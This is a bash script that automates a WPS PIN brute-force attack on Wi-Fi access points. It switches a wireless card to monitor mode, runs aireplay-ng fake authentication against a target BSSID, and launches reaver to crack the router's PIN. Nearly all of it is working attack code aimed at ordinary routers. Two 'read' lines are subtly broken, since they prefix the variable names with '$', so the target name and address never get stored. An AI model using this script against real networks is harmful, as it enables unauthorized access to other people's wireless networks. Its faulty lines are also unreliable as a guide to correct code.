#!/bin/bash

###########################
#         REAVER          #
###########################

# Requires wash package and reaver

# WPA and WPA2 encryption are improvements over WEP
# Some routers and other devices have WPS buttons that can be exploited
# Instead of having to enter a pass key, WPS generates a 8 digit pin that can be cracked with brute force
# This is a flaw with the router, not WPA itself


# airmon-ng start wlan1

echo 'What interface are you using?'
read interface

ifconfig $interface

echo ''
echo 'What is your MAC address?'
read mac

echo ''
echo "What is the name (ESSID) of the target access point?"
read $essid				# C0:56:27:71:8E:24, 20:AA:4B:65:99:42

echo ''
echo "What is the MAC address (BSSID) of the target access point?"
read $bssid

echo ''
echo "What channel is the access point on?"
read ch

ifconfig $interface down
iwconfig $interface mode monitor
iwconfig $interface channel $ch
ifconfig $interface up

echo 'Ready?'
read pause

aireplay-ng -1 0 -o 1 -q 10 -e $essid -a $bssid -h $mac $interface

reaver -b $bssid -c $ch -i $interface -A
# -b bssid
# -c channel
# -i interface

# airmon-ng stop wlan1

# ifconfig wlan0 down
# iwconfig wlan0 mode managed
# ifconfig wlan0 up
